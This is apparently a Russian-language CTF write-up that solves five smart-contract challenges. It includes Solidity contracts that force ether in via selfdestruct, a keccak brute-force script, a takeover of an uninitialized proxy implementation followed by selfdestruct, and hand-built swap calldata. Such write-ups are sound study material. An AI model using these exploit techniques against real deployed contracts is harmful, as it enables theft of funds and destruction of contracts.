# 0. Unpayable
Задеплоим такой контракт:

```
contract Pay{
    receive() external payable{

    }
    function destroy(address payable addr) public{
        selfdestruct(addr);
    }
}
```
Пополним его баланс переводом на его адрес, потом вызовем `destroy(<адрес контракта Unpayable>)`

# 1. Bank
Типичный reentrancy, решение Ethernaut lvl 10 почти идеально [подходит](https://medium.com/coinmonks/ethernaut-lvl-10-re-entrancy-walkthrough-how-to-abuse-execution-ordering-and-reproduce-the-dao-7ec88b912c14) (отличается только имя одной функции)

# 2. MagicSequence
Нужно сбрутить 4 числа, такие, что старшие 4 байта хеша будут равны `[0xbeced095, 0x42a7b7dd, 0x45e010b9, 0xa86c339e]`:
```
from eth_hash.auto import keccak
for s in ["beced095", "42a7b7dd", "45e010b9", "a86c339e"]:
    for i in range(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF):
        if keccak((i).to_bytes(32, byteorder="big")).hex()[:8]==s:
            print(i)
            break
```
Получаем числа `42, 55, 256, 9876543`. Деплоим следующий контракт и вызываем функцию `pwn(<адрес контракта задания>)`:
```
interface Magic{
      function start() public returns(bool);
}
contract Player{
    uint[] nums;
    uint pointer;
    constructor() public{
        nums.push(42);
        nums.push(55);
        nums.push(256);
        nums.push(9876543);
        pointer = 0;
    }
    function number() public returns(uint){
        return nums[pointer++];
    }
    function pwn(address addr) public{
        Magic(addr).start();
    }
}
```
# 3. Executor
Узнаем адрес Executor'а:
```
await web3.eth.getStorageAt(contract.address, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")
```
Скомпилим Executor в remix(чтоб получить abi), прицепимся к контракту по полученому адресу и вызовем `initialize()`.

Задеплоим ещё один контракт:
```
contract Destroy{
    function exec() public{
        selfdestruct(address(0));
    }
}
```
И вызовем `execute(<адрес контракта Destroy>)` у Executor.

# 4. SecureSwap
Открываем контракт роутера на сканере, выбираем любую транзакцию `swapExactTokensFortokens` и смотрим input data:
MethodID | 0x38ed1739 | Селектор
------ | ------ | -----
0 | 0000000000000000000000000000000000000000000000004b13531ed51afd1f | amountIn
1 | 00000000000000000000000000000000000000000000000000000000001fd2ff | amountOutMin
2 | 00000000000000000000000000000000000000000000000000000000000000a0 | адрес начала массива
3 | 000000000000000000000000d491ab9b2f73348226a1618a01c6285d6a49b79f | to
4 | 00000000000000000000000000000000000000000000000000000000626170bc | deadline
5 | 0000000000000000000000000000000000000000000000000000000000000002 | длина массива
6 | 0000000000000000000000006bd193ee6d2104f14f94e2ca6efefae561a4334b | первый токен
7 | 000000000000000000000000e3f5a90f9cb311505cd691a46596599aa1a0ad7d | второй токен

Собираем все как нам нужно:
MethodID | 0x38ed1739 | Селектор
------ | ------ | -----
0 | 00000000000000000000000000000000000000000000000000038d7ea4c68000 | amountIn(количество WMOVR в Wei)
1 | 0000000000000000000000000000000000000000000000000000000000000001 | amountOutMin
2 | 00000000000000000000000000000000000000000000000000000000000000a0 | адрес начала массива
3 | 000000000000000000000000\<contract.address\> | to
4 | 00000000000000000000000000000000000000000000000000000000f26170bc | deadline (просто побольше)
5 | 0000000000000000000000000000000000000000000000000000000000000003 | длина массива
6 | 000000000000000000000000\<WMOVR\> | первый токен
7 | 000000000000000000000000\<USDC\> | второй токен
8 | 000000000000000000000000\<DAI\> | третий токен (просто адрес любого токена не из списка)
